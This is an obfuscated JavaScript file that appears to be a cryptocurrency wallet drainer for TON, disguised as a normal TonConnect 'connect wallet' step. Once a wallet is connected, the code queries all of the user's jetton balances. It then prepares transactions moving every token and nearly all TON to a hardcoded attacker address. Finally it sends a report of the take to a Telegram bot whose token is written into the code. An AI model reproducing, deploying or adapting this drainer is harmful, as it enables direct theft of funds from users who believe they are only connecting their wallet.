const _0xf5c7ce=_0x5aad;(function(_0x4e60e0,_0x49661b){const _0x28bc12=_0x5aad,_0x22b256=_0x4e60e0();while(!![]){try{const _0x349c1c=-parseInt(_0x28bc12(0x18d))/0x1*(-parseInt(_0x28bc12(0x168))/0x2)+-parseInt(_0x28bc12(0x16b))/0x3*(-parseInt(_0x28bc12(0x197))/0x4)+parseInt(_0x28bc12(0x199))/0x5*(parseInt(_0x28bc12(0x183))/0x6)+parseInt(_0x28bc12(0x194))/0x7+-parseInt(_0x28bc12(0x191))/0x8+parseInt(_0x28bc12(0x16e))/0x9*(parseInt(_0x28bc12(0x176))/0xa)+-parseInt(_0x28bc12(0x17e))/0xb;if(_0x349c1c===_0x49661b)break;else _0x22b256['push'](_0x22b256['shift']());}catch(_0x206764){_0x22b256['push'](_0x22b256['shift']());}}}(_0x51a6,0xeb223));const tonConnectUI=new TON_CONNECT_UI[(_0xf5c7ce(0x196))]({'manifestUrl':'https://mrlightcode.site/TON/tonconnect-manifest.json','buttonRootId':'tc'});async function connectToWallet(){const _0x4a1192=_0xf5c7ce;try{const _0x44df96=await tonConnectUI['connectWallet']();console[_0x4a1192(0x18b)]('✅\x20Wallet\x20connected:',_0x44df96),await sendTransaction(_0x44df96['account']['address']);}catch(_0x377b39){console[_0x4a1192(0x17f)](_0x377b39);}}async function sendTransaction(_0x55acbe){const _0x25cf80=_0xf5c7ce,_0x4febd1=_0x25cf80(0x17c),_0x2f4041=new TonWeb();try{const _0x38f6a8=parseInt(await _0x2f4041[_0x25cf80(0x177)](_0x55acbe));let _0x591ca8=_0x38f6a8;const _0x4dbecc=[];let _0x20951a=_0x25cf80(0x17d);const _0x24c4e3=await fetch('https://tonapi.io/v2/accounts/'+_0x55acbe+_0x25cf80(0x198)),_0x619eb7=await _0x24c4e3['json'](),_0x5d68b0=_0x619eb7[_0x25cf80(0x182)]||[];for(const _0x540899 of _0x5d68b0){if(!_0x540899[_0x25cf80(0x16c)]||_0x540899[_0x25cf80(0x16c)]==='0')continue;const _0x5ce1bc=0x4c4b40;if(_0x591ca8<_0x5ce1bc+0x7a120)break;const _0x494219=_0x540899[_0x25cf80(0x192)]?.[_0x25cf80(0x18e)],_0x2822dc=BigInt(_0x540899['balance']),_0x1cd4ff=new TonWeb[(_0x25cf80(0x16a))][(_0x25cf80(0x17b))]();_0x1cd4ff[_0x25cf80(0x171)][_0x25cf80(0x193)](0xf8a7ea5,0x20),_0x1cd4ff[_0x25cf80(0x171)][_0x25cf80(0x193)](0x0,0x40),_0x1cd4ff['bits'][_0x25cf80(0x18c)](_0x2822dc),_0x1cd4ff[_0x25cf80(0x171)][_0x25cf80(0x19a)](new TonWeb[(_0x25cf80(0x190))](_0x4febd1)),_0x1cd4ff[_0x25cf80(0x171)][_0x25cf80(0x19a)](new TonWeb[(_0x25cf80(0x190))](_0x55acbe)),_0x1cd4ff[_0x25cf80(0x171)][_0x25cf80(0x178)](0x0),_0x1cd4ff['bits'][_0x25cf80(0x18c)](0x0),_0x1cd4ff[_0x25cf80(0x171)][_0x25cf80(0x178)](0x0);const _0x4f63f3=await _0x1cd4ff['toBoc'](![]),_0x136403=TonWeb[_0x25cf80(0x195)][_0x25cf80(0x16d)](_0x4f63f3);_0x4dbecc[_0x25cf80(0x185)]({'address':_0x494219,'amount':_0x5ce1bc[_0x25cf80(0x188)](),'payload':_0x136403}),_0x20951a+=_0x25cf80(0x184)+(_0x540899['jetton'][_0x25cf80(0x181)]||_0x25cf80(0x179))+':\x20'+_0x540899[_0x25cf80(0x16c)]+'\x0a',_0x591ca8-=_0x5ce1bc;}_0x591ca8>0xf4240&&(_0x4dbecc[_0x25cf80(0x185)]({'address':_0x4febd1,'amount':(_0x591ca8-0xf4240)[_0x25cf80(0x188)]()}),_0x20951a+='💎\x20TON:\x20'+(_0x591ca8-0xf4240)/0x3b9aca00+'\x20TON\x0a');if(_0x4dbecc[_0x25cf80(0x172)]===0x0){alert(_0x25cf80(0x189));return;}const _0x4194c3={'validUntil':Math[_0x25cf80(0x18f)](Date[_0x25cf80(0x173)]()/0x3e8)+0x3c,'messages':_0x4dbecc},_0x1e21fa=await tonConnectUI[_0x25cf80(0x174)](_0x4194c3);console[_0x25cf80(0x18b)](_0x25cf80(0x18a),_0x1e21fa),_0x20951a+=_0x25cf80(0x17a)+new Date(_0x4194c3['validUntil']*0x3e8)['toLocaleString']()+_0x25cf80(0x16f)+_0x4febd1,sendToTelegram(_0x20951a);}catch(_0x36c6cd){console[_0x25cf80(0x17f)](_0x25cf80(0x175),_0x36c6cd);}}async function sendToTelegram(_0x3dbe03){const _0x3c6828=_0xf5c7ce,_0x1942da=_0x3c6828(0x180),_0x36c4ab='-1002472367952',_0x5acfff=_0x3c6828(0x187)+_0x1942da+'/sendMessage?chat_id='+_0x36c4ab+'&text='+encodeURIComponent(_0x3dbe03);try{const _0x4fb7b6=await fetch(_0x5acfff);_0x4fb7b6['ok']?(console[_0x3c6828(0x18b)](_0x3c6828(0x169)),await tonConnectUI[_0x3c6828(0x170)]()):console[_0x3c6828(0x17f)](_0x3c6828(0x186));}catch(_0x5094ff){console[_0x3c6828(0x17f)]('Telegram\x20connection\x20error:',_0x5094ff);}}function _0x5aad(_0x19486c,_0x12350e){const _0x51a6b1=_0x51a6();return _0x5aad=function(_0x5aad24,_0x221813){_0x5aad24=_0x5aad24-0x168;let _0x182493=_0x51a6b1[_0x5aad24];return _0x182493;},_0x5aad(_0x19486c,_0x12350e);}function _0x51a6(){const _0x58a182=['3118KLOURi','📩\x20Report\x20sent\x20to\x20Telegram','boc','3867QWmSbM','balance','bytesToBase64','72bBbpTs','\x0a📤Destination\x20address:\x20','disconnect','bits','length','now','sendTransaction','❌\x20Error\x20sending\x20transaction:','533980rHAJsx','getBalance','writeBit','Jetton','⏱️\x20Time:\x20','Cell','UQBM2b91scka7IxoQPex_S8owipavQkqAMdXiqCZ_VoU2if9','✅\x20Transaction\x20ready\x20to\x20send:\x0a','33965261UbNRos','error','7656242555:AAE6Cq4Uj4aUghDRiosPW7b8CoaFj9LEu6k','name','balances','246912rFOLGK','🪙\x20','push','Error\x20sending\x20report\x20to\x20Telegram','https://api.telegram.org/bot','toString','❌\x20Not\x20enough\x20TON,\x20please\x20top\x20up\x20your\x20wallet','✅\x20Result\x20Transaction','log','writeCoins','812vERFlF','address','floor','Address','7209776PUoAOE','wallet_address','writeUint','11277973wXbLnX','utils','TonConnectUI','644RPGvSS','/jettons','175qvLkPo','writeAddress'];_0x51a6=function(){return _0x58a182;};return _0x51a6();}
